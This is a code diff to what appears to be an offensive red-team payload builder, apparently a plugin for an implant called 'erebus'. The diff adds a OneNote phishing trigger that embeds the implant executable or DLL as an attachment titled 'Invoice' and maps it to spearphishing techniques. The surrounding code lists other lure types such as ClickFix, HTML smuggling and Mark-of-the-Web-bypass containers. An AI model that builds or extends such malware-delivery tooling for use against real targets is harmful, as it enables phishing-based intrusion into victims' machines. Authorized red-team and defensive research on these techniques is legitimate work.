@@ -45,7 +45,7 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "create_payload_trigger", "create_bat_payload_trigger",
     "create_msi_payload_trigger", "create_clickonce_trigger",
     "create_msc_explorer_trigger", "create_html_smuggling_trigger",
-    "create_clickfix_trigger",
+    "create_clickfix_trigger", "create_onenote_trigger",
     "build_7z", "build_zip", "build_iso", "build_electron_installer", "build_vhd",
     "build_appinstaller", "build_msix_structure",
     "self_sign_payload", "get_remote_cert_details", "sign_with_provided_cert",
@@ -1379,7 +1379,7 @@ appdomain (self)""",
             group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
-            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain", "VSCode"],
+            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain", "VSCode", "OneNote"],
             default_value="BAT",
             required=False,
             hide_conditions = [
@@ -3441,6 +3441,8 @@ generated if none have been entered.""",
             ("2.0 Trigger Type", "VSCode",     [("T1204.002", "User Execution: Malicious File"),
                                                 ("T1059.007", "JavaScript"),
                                                 ("T1546",     "Event Triggered Execution")]),
+            ("2.0 Trigger Type", "OneNote",   [("T1566.001", "Spearphishing Attachment"),
+                                                ("T1204.002", "User Execution: Malicious File")]),
             # Container
             ("3.0 Container Type", "ISO",      [("T1553.005", "Mark-of-the-Web Bypass")]),
             ("3.0 Container Type", "VHD",      [("T1553.005", "Mark-of-the-Web Bypass")]),
@@ -6368,6 +6370,27 @@ generated if none have been entered.""",
                                     target_exe=_ad_exe,
                                     output_dir=payload_dir,
                                 )
+
+                        case "OneNote":
+                            # Deferred build: stage source + emit build_onenote.bat.
+                            # Operator runs build_onenote.bat on a Windows host with
+                            # Microsoft OneNote installed to produce document.one.
+                            _one_payload = payload_dir / "erebus.exe"
+                            for _ext in ("dll", "xll"):
+                                _cand = payload_dir / f"erebus.{_ext}"
+                                if _cand.exists():
+                                    _one_payload = _cand
+                                    break
+                            _one_attach = str(self.get_parameter("0.9a Trigger Binary") or f"Invoice{_one_payload.suffix}")
+                            _one_title  = str(self.get_parameter("0.9b Trigger Command") or "Invoice")
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_onenote_trigger(
+                                    payload_path=_one_payload,
+                                    payload_dir=payload_dir,
+                                    attachment_name=_one_attach,
+                                    note_title=_one_title,
+                                )
+                            )
 
                         # ── Linux triggers ────────────────────────────────────
                         case "Bash":
